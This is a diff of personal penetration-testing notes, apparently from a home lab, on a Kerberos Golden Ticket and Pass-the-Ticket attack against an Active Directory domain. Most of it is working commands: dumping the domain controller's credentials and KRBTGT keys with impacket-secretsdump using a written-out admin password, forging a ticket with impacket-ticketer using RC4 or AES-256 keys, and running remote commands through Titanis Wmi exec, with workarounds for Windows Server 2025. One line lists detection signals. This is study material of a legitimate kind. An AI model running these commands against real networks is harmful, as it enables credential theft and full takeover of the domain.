@@ -326,12 +326,24 @@ Golden Ticket attack + Pass the Ticket PtT
 impacket-secretsdump MARVEL.local/Administrator:'P@$$w0rd!123'@192.168.1.10 -outputfile full_ad_dump # GET KRBTGT HASH!
 impacket-lookupsid marvel.local/administrator:'P@$$w0rd!123'@192.168.1.10 # GET DOMAIN SID
 #ATTACK!
-impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <DOMAIN_SID> -domain marvel.local Administrator
+impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid <DOMAIN_SID> -domain marvel.local Administrator #OLDER, FOR RC4 KERBEROS
+impacket-ticketer -aesKey <KRBTGT_AES256_KEY> -domain-sid <DOMAIN_SID> -domain marvel.local -duration 10 Administrator #ACTUALLY WORKED
+# Used the 2nd command to properly generate a TGT. Use the AES-256 key obtained from the NTDS.dit dump
 #uses dcsync
 export KRB5CCNAME=Administrator.ccache
 #can forge ticket for any user, as long as they exist
 #Persistence
-dir \\DC01\C$ #prove total domain control
+sudo ~/workspace/tools/linux/linux-x64/Wmi exec HYDRA-DC01.MARVEL.local -Kdc 192.168.1.10 "whoami /priv" #prove total domain control
+# Note, win 2025 is very problematic. Use trusted sec titanis instead of wmi exec to use the correct kerberos
+# REMEMBER, Impacket offers RC4 Kerberos which win serv 2025 will auto deny. Use trusted sec orpheus and titanis.
+# For ease of use go to:
+https://github.com/trustedsec/Titanis/releases
+# Go to latest release and click "Assets", download the Linux AMDx64 sc (sc is minimal setup)
+# Navigate to Titanis zipped folder, unzip it and go inside. It will be called linux-x64 when unzipped, Titanis is a collection of tools, each is inside the linux-x64 folder
+# Edit /etc/hosts and ensure both HYDRA-DC01 and HYDRA-DC01.marvel.local point to the DC. Titanus used only HYDRA-DC01 when name resolving
+# Example config for /etc/hosts: 192.168.1.10 HYDRA-DCO1
+# Detection: 4769 with anomalous SIDs, ticket lifetime anomalies, krbtgt rotation invalidates all forged tickets.
+use impacket secrets dump to get krbtgt, then generating with impacket ticketer aes ticket.. then downloading titanus sc, unopacking it, syncing time, adding a new entry to /etc/hosts, and then exporting the name of the ticket, and then running titanus
 
 #can you kerberoast tgt??? why not? Hmm... SPN? 
 
